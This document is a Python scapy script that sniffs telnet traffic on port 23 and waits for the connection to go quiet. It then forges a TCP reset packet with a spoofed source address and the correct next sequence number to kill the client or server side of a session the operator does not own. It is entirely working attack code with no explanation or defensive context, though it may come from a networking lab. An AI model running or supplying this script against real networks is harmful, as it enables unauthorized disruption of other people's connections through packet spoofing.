import sys
import time
from scapy.all import *

IFACE = "enp0s3"
PORT = 23
STABILIZE_TIME = 30
last_packet = None
last_seen_time = time.time()

def packet_callback(pkt):
    global last_packet, last_seen_time
    if TCP in pkt and (pkt[TCP].sport == PORT or pkt[TCP].dport == PORT):
        last_packet = pkt
        last_seen_time = time.time()
        
        payload_len = len(pkt[TCP].payload)
        if payload_len == 0:
            print(f"\n{pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")
            print(f"    SEQ {pkt[TCP].seq}  ACK: {pkt[TCP].ack} {pkt[TCP].flags}")
        else:
            sys.stdout.write("X")
            sys.stdout.flush()

print(f"Started. Proceed if no activity for 30seconds")

def stop_sniffing(pkt):
    return False

sniff(iface=IFACE, 
      filter=f"tcp port {PORT}", 
      prn=packet_callback, 
      timeout=STABILIZE_TIME,
      store=0)

while True:
    current_time = time.time()
    silence_duration = current_time - last_seen_time
    
    if silence_duration >= STABILIZE_TIME:
        print("Time to kill connection")
        break
    
    remaining = STABILIZE_TIME - silence_duration
    sniff(iface=IFACE, filter=f"tcp port {PORT}", prn=packet_callback, timeout=remaining, store=0)

if not last_packet:
    print("interface is not up")
    sys.exit(1)

ip_layer = last_packet[IP]
tcp_layer = last_packet[TCP]

print(f"{ip_layer.src}:{tcp_layer.sport} TO {ip_layer.dst}:{tcp_layer.dport}")
print(f"SEQ {tcp_layer.seq}  ACK: {tcp_layer.ack}  Len {len(tcp_layer.payload)}")

print("\nWhom do you want to kill?")
print("[1] Client")
print("[2] Server")
choice = input("Enter 1 or 2 ")

if tcp_layer.sport == PORT:
    server_ip, client_ip = ip_layer.src, ip_layer.dst
    server_port, client_port = tcp_layer.sport, tcp_layer.dport
    next_expected_by_client = tcp_layer.seq + len(tcp_layer.payload)
    next_expected_by_server = tcp_layer.ack
else:
    client_ip, server_ip = ip_layer.src, ip_layer.dst
    client_port, server_port = tcp_layer.sport, tcp_layer.dport
    next_expected_by_server = tcp_layer.seq + len(tcp_layer.payload)
    next_expected_by_client = tcp_layer.ack

if choice == "1":
    print(f"sending packet to ({client_ip})")
    target_ip, spoof_ip = client_ip, server_ip
    target_port, spoof_port = client_port, server_port
    kill_seq = next_expected_by_client
elif choice == "2":
    print(f"sending packet to ({server_ip})")
    target_ip, spoof_ip = server_ip, client_ip
    target_port, spoof_port = server_port, client_port
    kill_seq = next_expected_by_server
else:
    print("Enter 1 or 2")
    sys.exit(1)

print(f"HPING TO {target_ip}")

rst_pkt = IP(src=spoof_ip, dst=target_ip) / \
          TCP(sport=spoof_port, dport=target_port, flags="R", seq=kill_seq)

send(rst_pkt, count=1, verbose=False)

print("Bye")